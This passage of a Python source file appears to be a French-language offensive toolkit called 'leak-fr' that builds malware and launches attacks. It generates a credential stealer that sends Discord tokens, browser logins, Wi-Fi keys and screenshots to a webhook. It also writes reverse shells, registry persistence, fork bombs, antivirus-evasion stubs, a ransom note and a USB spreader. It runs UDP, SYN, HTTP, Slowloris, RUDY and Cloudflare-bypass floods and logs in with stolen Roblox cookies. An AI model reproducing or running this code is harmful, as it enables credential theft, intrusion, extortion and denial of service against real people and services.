    paths = {"Discord": os.path.join(appdata, "Discord", "Local Storage", "leveldb"),
             "Chrome": os.path.join(local, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),
             "Edge": os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")}
    pattern = re.compile(r"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}|mfa\\.[\\w-]{84}")
    found = []
    for name, path in paths.items():
        if not os.path.isdir(path): continue
        for fname in os.listdir(path):
            if not fname.endswith((".log", ".ldb")): continue
            try:
                with open(os.path.join(path, fname), "r", errors="ignore") as f:
                    for token in pattern.findall(f.read()):
                        if any(t["token"] == token for t in found): continue
                        r = req.get("https://discord.com/api/v9/users/@me",
                                    headers={"Authorization": token}, timeout=3)
                        if r.status_code == 200:
                            u = r.json()
                            found.append({"token": token,
                                          "username": f"{u.get('username')}#{u.get('discriminator','0')}",
                                          "email": u.get("email", "N/A"),
                                          "nitro": u.get("premium_type", 0)})
            except Exception: pass
    return found
def passwords():
    results = []; local = os.environ.get("LOCALAPPDATA", "")
    dbs = [os.path.join(local, "Google", "Chrome", "User Data", "Default", "Login Data"),
           os.path.join(local, "Microsoft", "Edge", "User Data", "Default", "Login Data")]
    for db in dbs:
        if not os.path.isfile(db): continue
        tmp = f"tmp_{abs(hash(db))}.db"
        try:
            shutil.copy2(db, tmp); conn = sqlite3.connect(tmp)
            for url, user, pwd in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                if user: results.append({"url": url, "username": user})
            conn.close()
        except Exception: pass
        finally:
            try: os.remove(tmp)
            except Exception: pass
    return results
def wifi_passwords():
    results = []
    if platform.system() != "Windows": return results
    try:
        out = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
        for p in re.findall(r"All User Profile\\s*:\\s*(.+)", out):
            p = p.strip()
            try:
                pw_out = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"],
                                        capture_output=True, text=True).stdout
                pw_m = re.search(r"Key Content\\s*:\\s*(.+)", pw_out)
                results.append({"ssid": p, "password": pw_m.group(1).strip() if pw_m else "(none)"})
            except Exception: pass
    except Exception: pass
    return results
def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab(); p = "_ss.png"; img.save(p); return p
    except Exception: return None
def main():
    info = sysinfo(); tokens = discord_tokens(); pwds = passwords()
    wifi = wifi_passwords()
    tok_str = ""
    for t in tokens[:5]:
        tok_str += f"**{t['username']}** | {t.get('email','?')} | Nitro:{t.get('nitro',0)}\\n`{t['token']}`\\n"
    embed = {"title": "leak-fr stealer -- New Victim", "color": 0xFF0000, "fields": [
        {"name": "System", "value": f"```{json.dumps(info, indent=2)[:900]}```", "inline": False},
        {"name": "Discord Tokens", "value": (tok_str[:1000] if tok_str else "None"), "inline": False},
        {"name": "Passwords", "value": f"**{len(pwds)}** entries", "inline": True},
        {"name": "WiFi", "value": f"**{len(wifi)}** networks", "inline": True}],
        "footer": {"text": f"leak-fr | {info.get('datetime','')}"}}
    send(embeds=[embed])
    if pwds:
        txt = "\\n".join(f"{p['url']} | {p['username']}" for p in pwds[:100])
        send(content="Passwords:", files={"file": ("passwords.txt", txt.encode())})
    if wifi:
        txt = "\\n".join(f"{w['ssid']} | {w['password']}" for w in wifi)
        send(content="WiFi:", files={"file": ("wifi.txt", txt.encode())})
    ss = screenshot()
    if ss and os.path.isfile(ss):
        with open(ss, "rb") as f: send(content="Screenshot:", files={"file": ("screenshot.png", f.read())})
        try: os.remove(ss)
        except Exception: pass
if __name__ == "__main__": main()
'''
    code = template.replace("__WEBHOOK__", webhook)
    os.makedirs("1-Output", exist_ok=True)
    path = os.path.join("1-Output", out_name)
    with open(path, "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Stealer -> {Y}{path}{RST} ")
    builder_ask_format(path); pause()


def builder_fake_error():
    banner_s("FAKE ERROR")
    title = input(f"  {W}Title: {RST} ").strip() or "System Error"
    msg = input(f"  {W}Message: {RST} ").strip() or "A critical error has occurred."
    icons = {"0": "0x10", "1": "0x20", "2": "0x30", "3": "0x40"}
    ico = icons.get(input(f"  {W}Icon 0=stop 1=? 2=warn 3=info: {RST} ").strip(), "0x10")
    code = f'import ctypes\nctypes.windll.user32.MessageBoxW(0, "{msg}", "{title}", {ico})\n'
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/fake_error.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/fake_error.py{RST}"); pause()


def builder_ask_format(py_path):
    if not os.path.isfile(py_path): return
    fmt = input(f"\n  {W}Format: {Y}[1]{RST}{W} .py  {Y}[2]{RST}{W} .exe: {RST}").strip()
    if fmt == "2":
        try:
            import PyInstaller
        except ImportError:
            print(f"\n{INF} Installation de PyInstaller... ")
            subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller", "--quiet"],
                           check=False)
        print(f"\n{INF} Compilation... ")
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--onefile", "--noconsole",
             "--distpath", "1-Output", "--workpath", "1-Output/build_tmp",
             "--specpath", "1-Output/build_tmp", py_path],
            capture_output=True, text=True)
        if result.returncode == 0:
            name = os.path.splitext(os.path.basename(py_path))[0]
            print(f"\n{OK} .exe -> {G}1-Output/{name}.exe{RST} ")
        else:
            print(f"\n{ERR} Erreur:\n{result.stderr[-500:]} ")


def builder_startup():
    banner_s("STARTUP PERSISTENCE")
    script = input(f"  {W}Script path: {RST} ").strip()
    code = ('import os,shutil,winreg\n'
            f'SCRIPT=r"{script}"\n'
            'STARTUP=os.path.join(os.environ.get("APPDATA",""),"Microsoft","Windows","Start Menu","Programs","Startup")\n'
            'try: shutil.copy2(SCRIPT,STARTUP); print("[+] Startup folder OK")\n'
            'except Exception as e: print(f"[-] {e}")\n'
            'try:\n'
            '    k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",0,winreg.KEY_SET_VALUE)\n'
            f'    winreg.SetValueEx(k, "leakfr", 0, winreg.REG_SZ, "python \\"{script}\\"")\n'
            '    winreg.CloseKey(k); print("[+] Registry OK")\n'
            'except Exception as e: print(f"[-] {e}")\n')
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/startup.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/startup.py{RST}"); pause()


def builder_forkbomb():
    banner_s("FORK BOMB")
    print(f"  {Y}[1]{RST} Python  {Y}[2]{RST} Batch  {Y}[3]{RST} Bash ")
    c = input(f"  {W}Choice: {RST} ").strip()
    os.makedirs("1-Output", exist_ok=True)
    if c == "1":
        with open("1-Output/forkbomb.py", "w", encoding="utf-8") as f:
            f.write("import os\nwhile True: os.fork()\n")
    elif c == "2":
        with open("1-Output/forkbomb.bat", "w", encoding="utf-8") as f:
            f.write(":loop\nstart %0\ngoto loop\n")
    elif c == "3":
        with open("1-Output/forkbomb.sh", "w", encoding="utf-8") as f:
            f.write(":(){ :|:& };:\n")
    print(f"\n{OK} Built in 1-Output/ "); pause()


def builder_revshell():
    banner_s("REVERSE SHELL")
    host = input(f"  {W}LHOST: {RST} ").strip()
    port = input(f"  {W}LPORT: {RST} ").strip() or "4444"
    print(f"  {Y}[1]{RST} Python  {Y}[2]{RST} PowerShell  {Y}[3]{RST} Bash ")
    c = input(f"  {W}Type: {RST} ").strip()
    os.makedirs("1-Output", exist_ok=True)
    if c == "1":
        code = f'''import socket, subprocess
s = socket.socket()
s.connect(("{host}", {port}))
while True:
    cmd = s.recv(1024).decode()
    if not cmd.strip(): continue
    out = subprocess.run(cmd, shell=True, capture_output=True)
    s.send(out.stdout + out.stderr)
'''
        with open("1-Output/revshell.py", "w", encoding="utf-8") as f: f.write(code)
        print(f"\n{OK} {Y}1-Output/revshell.py{RST}\n  {DIM}Listener: nc -lvnp {port}{RST} ")
        builder_ask_format("1-Output/revshell.py")
    elif c == "2":
        ps = (f"$c=New-Object System.Net.Sockets.TCPClient('{host}',{port});"
              "$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
              "while(($i=$s.Read($b,0,$b.Length))-ne 0){{"
              "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
              "$r=(iex $d 2>&1|Out-String);$rb=$r+'PS '+(pwd).Path+'> ';"
              "$sb=([text.encoding]::ASCII).GetBytes($rb);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()")
        with open("1-Output/revshell.ps1", "w", encoding="utf-8") as f: f.write(ps)
        print(f"\n{OK} {Y}1-Output/revshell.ps1{RST} ")
    elif c == "3":
        with open("1-Output/revshell.sh", "w", encoding="utf-8") as f:
            f.write(f"bash -i >& /dev/tcp/{host}/{port} 0>&1\n")
        print(f"\n{OK} {Y}1-Output/revshell.sh{RST} ")
    pause()


def builder_av_bypass():
    banner_s("AV BYPASS STUB")
    payload = input(f"  {W}Payload .py path: {RST} ").strip()
    out = input(f"  {W}Output name: {RST} ").strip() or "stub.py"
    print(f"  {Y}[1]{RST} XOR  {Y}[2]{RST} Base64  {Y}[3]{RST} Delay  {Y}[4]{RST} All ")
    method = input(f"  {W}Method: {RST} ").strip()
    os.makedirs("1-Output", exist_ok=True)
    if not os.path.isfile(payload):
        print(f"{ERR} File not found. "); pause(); return
    with open(payload, "r", encoding="utf-8", errors="ignore") as f:
        src = f.read()
    key = random.randint(1, 254)
    enc_xor = base64.b64encode(bytes(b ^ key for b in src.encode())).decode()
    enc_b64 = base64.b64encode(src.encode()).decode()
    if method == "1":
        stub = f'import base64\n_k={key}\n_d=base64.b64decode("{enc_xor}")\nexec(bytes(b^_k for b in _d).decode())\n'
    elif method == "2":
        stub = f'import base64\nexec(base64.b64decode("{enc_b64}").decode())\n'
    elif method == "3":
        stub = f'''import base64, time, os, platform
if os.environ.get("COMPUTERNAME","").lower() in ["sandbox","virus","test"]:
    exit()
if platform.processor() == "":
    exit()
time.sleep(15)
exec(base64.b64decode("{enc_b64}").decode())
'''
    elif method == "4":
        stub = f'''import base64, time, os, platform
if os.environ.get("COMPUTERNAME","").lower() in ["sandbox","virus","test"]:
    exit()
time.sleep(12)
_k={key}
_d=base64.b64decode("{enc_xor}")
exec(bytes(b^_k for b in _d).decode())
'''
    else:
        print(f"{ERR} Invalid. "); pause(); return
    path = os.path.join("1-Output", out)
    with open(path, "w", encoding="utf-8") as f: f.write(stub)
    print(f"\n{OK} Stub -> {Y}{path}{RST} "); pause()


def builder_ransom_note():
    banner_s("RANSOMWARE NOTE")
    title = input(f"  {W}Title: {RST} ").strip() or "YOUR FILES HAVE BEEN ENCRYPTED"
    contact = input(f"  {W}Contact: {RST} ").strip() or "contact@example.com"
    amount = input(f"  {W}Amount: {RST} ").strip() or "0.05 BTC"
    deadline = input(f"  {W}Deadline: {RST} ").strip() or "72 hours"
    uid = hashlib.md5(os.urandom(16)).hexdigest().upper()
    note = f"""
+========================================================+
|      !!!  {title}  !!!      |
+========================================================+
All your important files have been encrypted.
To decrypt you must pay {amount} within {deadline}.
Contact: {contact}
Unique ID: {uid}
=========================================================
"""
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/README_DECRYPT.txt", "w", encoding="utf-8") as f: f.write(note)
    print(f"\n{OK} Note -> {Y}1-Output/README_DECRYPT.txt{RST}")
    print(note); pause()


def builder_usb_spreader():
    banner_s("USB SPREADER")
    payload = input(f"  {W}Payload filename: {RST}").strip() or "stealer.py"
    code = f'''import os, shutil, string
PAYLOAD = r"{payload}"
def get_drives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{{letter}}:\\\\"
        if os.path.exists(drive) and drive != os.path.splitdrive(os.getcwd())[0] + "\\\\":
            drives.append(drive)
    return drives
def spread():
    if not os.path.isfile(PAYLOAD): return
    for drive in get_drives():
        try:
            shutil.copy2(PAYLOAD, os.path.join(drive, os.path.basename(PAYLOAD)))
            with open(os.path.join(drive, "autorun.inf"), "w") as f:
                f.write(f"[AutoRun]\\nopen=python {{os.path.basename(PAYLOAD)}}\\n")
            print(f"[+] Spread to {{drive}}")
        except Exception as e:
            print(f"[-] {{drive}}: {{e}}")
if __name__ == "__main__":
    spread()
'''
    os.makedirs("1-Output", exist_ok=True)
    with open("1-Output/usb_spreader.py", "w", encoding="utf-8") as f: f.write(code)
    print(f"\n{OK} Built -> {Y}1-Output/usb_spreader.py{RST}"); pause()


# ========================================================================
# DDOS
# ========================================================================
def ddos_menu():
    while True:
        opts = [("01", "UDP Flood"), ("02", "TCP SYN Flood"),
                ("03", "HTTP GET Flood"), ("04", "Slowloris"),
                ("05", "Multi-threaded UDP Flood"), ("00", "Retour")]
        menu_box("DDOS / STRESSER", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": ddos_udp()
        elif c == "02": ddos_tcp()
        elif c == "03": ddos_http()
        elif c == "04": ddos_slowloris()
        elif c == "05": ddos_udp_threaded()
        elif c == "00": break


def ddos_udp():
    banner_s("UDP FLOOD")
    host = input(f"  {W}Target IP: {RST} ").strip()
    port = int(input(f"  {W}Port: {RST} ").strip() or "80")
    duration = int(input(f"  {W}Duration (s): {RST} ").strip() or "10")
    payload = random._urandom(1024)
    print(f"\n{INF} UDP flood -> {Y}{host}:{port}{RST} for {duration}s...\n ")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end = time.time() + duration; sent = 0
    try:
        while time.time() < end:
            sock.sendto(payload, (host, port)); sent += 1
            if sent % 1000 == 0: print(f"  {G}[~]{RST} {sent} packets ")
    except KeyboardInterrupt:
        pass
    finally: sock.close()
    print(f"\n{OK} Done. {sent} packets. "); pause()


def ddos_tcp():
    banner_s("TCP SYN FLOOD")
    host = input(f"  {W}Target IP: {RST} ").strip()
    port = int(input(f"  {W}Port: {RST} ").strip() or "80")
    duration = int(input(f"  {W}Duration (s): {RST} ").strip() or "10")
    print(f"\n{INF} TCP flood -> {Y}{host}:{port}{RST}\n ")
    end = time.time() + duration; sent = 0
    try:
        while time.time() < end:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((host, port)); s.close(); sent += 1
                if sent % 100 == 0: print(f"  {G}[~]{RST} {sent} attempts ")
            except Exception: pass
    except KeyboardInterrupt:
        pass
    print(f"\n{OK} Done. {sent} attempts. "); pause()


def ddos_http():
    banner_s("HTTP GET FLOOD")
    url = input(f"  {W}Target URL: {RST} ").strip()
    duration = int(input(f"  {W}Duration (s): {RST} ").strip() or "10")
    threads_n = int(input(f"  {W}Threads: {RST} ").strip() or "50")
    print(f"\n{INF} HTTP flood -> {Y}{url}{RST}\n ")
    stop = {"v": False}; sent_total = [0]
    def flood():
        ua_list = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                   "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
                   "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"]
        while not stop["v"]:
            try:
                ua = random.choice(ua_list)
                requests.get(url, headers={"User-Agent": ua}, timeout=2)
                sent_total[0] += 1
            except Exception: pass
    threads_list = [threading.Thread(target=flood, daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} requests ", end=" "); time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    stop["v"] = True
    print(f"\n\n{OK} Done. {sent_total[0]} requests. "); pause()


def ddos_slowloris():
    banner_s("SLOWLORIS")
    host = input(f"  {W}Target host: {RST} ").strip()
    port = int(input(f"  {W}Port: {RST} ").strip() or "80")
    sockets_n = int(input(f"  {W}Sockets: {RST} ").strip() or "150")
    duration = int(input(f"  {W}Duration (s): {RST} ").strip() or "30")
    print(f"\n{INF} Slowloris -> {Y}{host}:{port}{RST}\n ")
    socks = []
    def init_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4); s.connect((host, port))
        s.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        s.send(f"Host: {host}\r\n".encode())
        s.send(b"User-Agent: Mozilla/5.0\r\n")
        s.send(b"Accept-language: en-US,en;q=0.5\r\n")
        return s
    print(f"{INF} Opening {sockets_n} sockets... ")
    for _ in range(sockets_n):
        try: socks.append(init_socket())
        except Exception: pass
    print(f"{OK} {len(socks)} sockets open. ")
    end = time.time() + duration
    try:
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {len(socks)} sockets alive ", end=" ")
            for s in list(socks):
                try: s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except Exception:
                    socks.remove(s)
                    try: socks.append(init_socket())
                    except Exception: pass
            time.sleep(15)
    except KeyboardInterrupt:
        pass
    for s in socks:
        try: s.close()
        except Exception: pass
    print(f"\n\n{OK} Slowloris done. "); pause()


def ddos_udp_threaded():
    banner_s("MULTI-THREADED UDP FLOOD")
    host = input(f"  {W}Target IP: {RST} ").strip()
    port = int(input(f"  {W}Port: {RST} ").strip() or "80")
    duration = int(input(f"  {W}Duration (s): {RST} ").strip() or "10")
    threads_n = int(input(f"  {W}Threads: {RST} ").strip() or "10")
    print(f"\n{INF} UDP flood -> {Y}{host}:{port}{RST}\n ")
    stop = {"v": False}; sent_total = [0]
    def flood():
        payload = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while not stop["v"]:
            try:
                sock.sendto(payload, (host, port)); sent_total[0] += 1
            except Exception: pass
        sock.close()
    threads_list = [threading.Thread(target=flood, daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} packets ", end=" "); time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    stop["v"] = True
    print(f"\n\n{OK} Done. {sent_total[0]} packets. "); pause()


def ddos_advanced_menu():
    while True:
        opts = [("01", "UDP Flood"), ("02", "TCP SYN Flood"),
                ("03", "HTTP GET Flood"), ("04", "Slowloris"),
                ("05", "Multi-thread UDP Flood"), ("06", "ICMP Flood"),
                ("07", "HTTP POST Flood"), ("08", "Rudy Attack"),
                ("09", "WebSocket Flood"), ("10", "Bypass Cloudflare"),
                ("11", "Mixed Protocol Flood"), ("00", "Retour")]
        menu_box("DDOS AVANCE", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": ddos_udp()
        elif c == "02": ddos_tcp()
        elif c == "03": ddos_http()
        elif c == "04": ddos_slowloris()
        elif c == "05": ddos_udp_threaded()
        elif c == "06": ddos_icmp()
        elif c == "07": ddos_http_post()
        elif c == "08": ddos_rudy()
        elif c == "09": ddos_websocket()
        elif c == "10": ddos_cf_bypass()
        elif c == "11": ddos_mixed()
        elif c == "00": break


def ddos_icmp():
    banner_s("ICMP FLOOD")
    host = input(f"  {W}Target IP: {RST}").strip()
    duration = int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    print(f"\n{INF} ICMP flood -> {Y}{host}{RST}\n ")
    end = time.time() + duration; sent = 0
    try:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            while time.time() < end:
                sock.sendto(b"leakfr" * 10, (host, 0)); sent += 1
                if sent % 1000 == 0: print(f"  {G}[~]{RST} {sent} paquets ")
        except PermissionError:
            print(f"  {Y}[!]{RST} Raw socket refuse -- ping fallback")
            param = "-n" if platform.system() == "Windows" else "-c"
            while time.time() < end:
                subprocess.run(["ping", param, "1", host], capture_output=True)
                sent += 1
    except KeyboardInterrupt:
        pass
    print(f"\n{OK} Done. {sent} paquets. "); pause()


def ddos_http_post():
    banner_s("HTTP POST FLOOD")
    url = input(f"  {W}Target URL: {RST}").strip()
    duration = int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    threads_n = int(input(f"  {W}Threads: {RST}").strip() or "50")
    print(f"\n{INF} HTTP POST flood -> {Y}{url}{RST}\n ")
    stop = {"v": False}; sent_total = [0]
    def flood():
        while not stop["v"]:
            try:
                data = {"f" + str(random.randint(1, 10)):
                        "".join(random.choices(string.ascii_letters, k=random.randint(100, 500)))}
                requests.post(url, data=data,
                              headers={"User-Agent": "Mozilla/5.0",
                                       "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4))},
                              timeout=2)
                sent_total[0] += 1
            except Exception: pass
    threads_list = [threading.Thread(target=flood, daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} POST ", end=" "); time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    stop["v"] = True
    print(f"\n\n{OK} Done. {sent_total[0]} POST. "); pause()


def ddos_rudy():
    banner_s("RUDY ATTACK")
    host = input(f"  {W}Target host: {RST}").strip()
    port = int(input(f"  {W}Port: {RST}").strip() or "80")
    path = input(f"  {W}Path: {RST}").strip() or "/"
    sockets_n = int(input(f"  {W}Sockets: {RST}").strip() or "100")
    duration = int(input(f"  {W}Duration (s): {RST}").strip() or "30")
    print(f"\n{INF} RUDY -> {Y}{host}:{port}{RST}\n ")
    socks = []; end = time.time() + duration
    def open_socket():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4); s.connect((host, port))
            req = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                   "Content-Type: application/x-www-form-urlencoded\r\n"
                   "Content-Length: 1000000\r\nUser-Agent: Mozilla/5.0\r\n"
                   "Connection: keep-alive\r\n\r\n")
            s.send(req.encode()); return s
        except Exception: return None
    for _ in range(sockets_n):
        s = open_socket()
        if s: socks.append(s)
    print(f"{OK} {len(socks)} connexions ouvertes. ")
    try:
        while time.time() < end:
            alive = []
            for s in socks:
                try: s.send(b"X"); alive.append(s)
                except Exception:
                    ns = open_socket()
                    if ns: alive.append(ns)
            socks[:] = alive
            print(f"\r  {G}[~]{RST} {len(socks)} connexions ", end=" ")
            time.sleep(10)
    except KeyboardInterrupt:
        pass
    for s in socks:
        try: s.close()
        except Exception: pass
    print(f"\n\n{OK} RUDY termine. "); pause()


def ddos_websocket():
    banner_s("WEBSOCKET FLOOD")
    url = input(f"  {W}WebSocket URL: {RST}").strip()
    duration = int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    connections = int(input(f"  {W}Connexions: {RST}").strip() or "50")
    try:
        import websocket as ws_lib
    except ImportError:
        pip("websocket-client"); import websocket as ws_lib
    print(f"\n{INF} WebSocket flood -> {Y}{url}{RST}\n ")
    stop = {"v": False}; sent_total = [0]
    def flood():
        try:
            ws = ws_lib.create_connection(url, timeout=5)
            while not stop["v"]:
                try:
                    ws.send("".join(random.choices(string.ascii_letters, k=512)))
                    sent_total[0] += 1
                except Exception: break
            try: ws.close()
            except Exception: pass
        except Exception: pass
    threads_list = [threading.Thread(target=flood, daemon=True) for _ in range(connections)]
    for t in threads_list: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} messages WS ", end=" ")
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    stop["v"] = True
    print(f"\n\n{OK} Done. {sent_total[0]} messages. "); pause()


def ddos_cf_bypass():
    banner_s("BYPASS CLOUDFLARE")
    url = input(f"  {W}URL cible: {RST}").strip()
    duration = int(input(f"  {W}Duration (s): {RST}").strip() or "10")
    threads_n = int(input(f"  {W}Threads: {RST}").strip() or "30")
    print(f"\n{INF} CF Bypass -> {Y}{url}{RST}\n ")
    stop = {"v": False}; sent_total = [0]; blocked = [0]
    def flood():
        while not stop["v"]:
            try:
                h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
                     "Accept": "*/*",
                     "X-Forwarded-For": ".".join(str(random.randint(1, 254)) for _ in range(4))}
                r = requests.get(url, headers=h, timeout=3)
                sent_total[0] += 1
                if r.status_code in [403, 429, 503]: blocked[0] += 1
            except Exception: pass
    threads_list = [threading.Thread(target=flood, daemon=True) for _ in range(threads_n)]
    for t in threads_list: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            print(f"\r  {G}[~]{RST} {sent_total[0]} req | bloquees:{R}{blocked[0]}{RST} ", end=" ")
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    stop["v"] = True
    rate = ((sent_total[0] - blocked[0]) / max(sent_total[0], 1)) * 100
    print(f"\n\n{OK} Done. Bypass rate: {G}{rate:.1f}%{RST} "); pause()


def ddos_mixed():
    banner_s("MIXED PROTOCOL FLOOD")
    host = input(f"  {W}Target IP: {RST}").strip()
    duration = int(input(f"  {W}Duration (s): {RST}").strip() or "15")
    threads_per_proto = int(input(f"  {W}Threads/proto: {RST}").strip() or "10")
    print(f"\n{INF} Mixed flood -> {Y}{host}{RST}\n ")
    stop = {"v": False}; counters = {"udp": 0, "tcp": 0, "http": 0}
    def udp_flood():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = random._urandom(1024)
        while not stop["v"]:
            try:
                s.sendto(payload, (host, random.randint(1, 65535)))
                counters["udp"] += 1
            except Exception: pass
    def tcp_flood():
        while not stop["v"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect_ex((host, random.randint(1, 65535))); s.close()
                counters["tcp"] += 1
            except Exception: pass
    def http_flood():
        while not stop["v"]:
            try:
                for port in [80, 443, 8080]:
                    requests.get(f"http://{host}:{port}", timeout=1,
                                 headers={"User-Agent": "Mozilla/5.0"})
                    counters["http"] += 1
            except Exception: pass
    all_threads = []
    for _ in range(threads_per_proto):
        all_threads.append(threading.Thread(target=udp_flood, daemon=True))
        all_threads.append(threading.Thread(target=tcp_flood, daemon=True))
        all_threads.append(threading.Thread(target=http_flood, daemon=True))
    for t in all_threads: t.start()
    try:
        end = time.time() + duration
        while time.time() < end:
            total = sum(counters.values())
            print(f"\r  {G}[~]{RST} UDP:{counters['udp']} TCP:{counters['tcp']} "
                  f"HTTP:{counters['http']} Total:{total} ", end=" ")
            time.sleep(0.5)
    except KeyboardInterrupt:
        pass
    stop["v"] = True
    print(f"\n\n{OK} Mixed flood done. Total: {sum(counters.values())}. "); pause()


# ========================================================================
# ROBLOX
# ========================================================================
def roblox_menu():
    while True:
        opts = [("01", "Cookie Login"), ("02", "Cookie Info"),
                ("03", "User by Username"), ("04", "User by ID"),
                ("05", "Game Info"), ("06", "Search Users"),
                ("07", "Group Info"), ("08", "Avatar Info"), ("00", "Retour")]
        menu_box("ROBLOX TOOLS", opts)
        c = input(f"  {R}>{RST} ").strip()
        if c == "01": rblx_cookie_login()
        elif c == "02": rblx_cookie_info()
        elif c == "03": rblx_by_name()
        elif c == "04": rblx_by_id()
        elif c == "05": rblx_game()
        elif c == "06": rblx_search()
        elif c == "07": rblx_group()
        elif c == "08": rblx_avatar()
        elif c == "00": break


def rblx_cookie_login():
    banner_s("ROBLOX COOKIE LOGIN")
    cookie = input(f"  {W}.ROBLOSECURITY: {RST} ").strip()
    h = {"Cookie": f".ROBLOSECURITY={cookie}"}
    r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h)
    if r.status_code != 200:
        print(f"{ERR} Invalid cookie. ({r.status_code}) "); pause(); return
    d = r.json(); uid = d.get("id")
    print(f"\n{OK} Logged in as: {G}{d.get('name')}{RST} (ID: {uid}) ")
    save_out(f"rblx_login_{uid}.txt",
             f"ID:{uid}\nUsername:{d.get('name')}\nCookie:{cookie} "); pause()


def rblx_cookie_info():
    banner_s("ROBLOX COOKIE INFO")
    cookie = input(f"  {W}.ROBLOSECURITY: {RST} ").strip()
    h = {"Cookie": f".ROBLOSECURITY={cookie}"}
    r = requests.get("https://users.roblox.com/v1/users/authenticated", headers=h)
    if r.status_code != 200:
        print(f"{ERR} Invalid cookie. ({r.status_code}) "); pause(); return
    d = r.json(); uid = d.get("id")
    robust = requests.get(f"https://economy.roblox.com/v1/users/{uid}/currency", headers=h).json()
    friends = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count", headers=h).json()
    premium = requests.get(f"https://premiumfeatures.roblox.com/v1/users/{uid}/validate-membership", headers=h)
    print(f"\n  {Y}ID      {RST}: {W}{uid}{RST}\n  {Y}Username{RST}: {W}{d.get('name')}{RST} ")
    print(f"  {Y}Robux   {RST}: {G}{robust.get('robux','?')}{RST}")
    print(f"  {Y}Friends {RST}: {W}{friends.get('count','?')}{RST} ")
    print(f"  {Y}Premium {RST}: {G if premium.status_code == 200 else R}{premium.status_code == 200}{RST} ")
    save_out(f"rblx_{uid}.txt", json.dumps({"user": d, "robux": robust.get("robux")}, indent=2))
    pause()


def rblx_by_name():
    banner_s("USER BY USERNAME")
    username = input(f"  {W}Username: {RST} ").strip()
    r = requests.post("https://users.roblox.com/v1/usernames/users",
                      json={"usernames": [username], "excludeBannedUsers": False}).json()
    if r.get("data"): _rblx_print_user(r["data"][0]["id"])
    else: print(f"{ERR} Not found. ")
    pause()


def rblx_by_id():
    banner_s("USER BY ID")
    uid = input(f"  {W}User ID: {RST}").strip()
    _rblx_print_user(uid); pause()


def _rblx_print_user(uid):
    r = requests.get(f"https://users.roblox.com/v1/users/{uid}").json()
    friends = requests.get(f"https://friends.roblox.com/v1/users/{uid}/friends/count").json()
    followers = requests.get(f"https://friends.roblox.com/v1/users/{uid}/followers/count").json()
    banned = r.get("isBanned", False)
    print(f"\n  {Y}ID          {RST}: {W}{r.get('id')}{RST} ")
    print(f"  {Y}Username    {RST}: {W}{r.get('name')}{RST} ")
    print(f"  {Y}Display     {RST}: {W}{r.get('displayName')}{RST} ")
    print(f"  {Y}Created     {RST}: {W}{str(r.get('created','?'))[:10]}{RST} ")
